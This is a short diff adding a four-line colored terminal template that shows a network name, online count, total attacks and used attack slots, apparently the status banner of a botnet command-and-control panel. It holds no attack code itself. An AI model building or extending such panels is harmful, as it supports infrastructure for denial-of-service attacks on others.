@@ -1,0 +1,4 @@
+[38;5;240mNetwork[97m: <<$cnc.name>>
+[38;5;240mOnline[97m: <<$total.online>>
+[38;5;240mTotal Attacks[97m: <<$total.attacks.count>>
+[38;5;240mSlots Used[97m: <<$total.ongoing>>/<<$max.slots>>
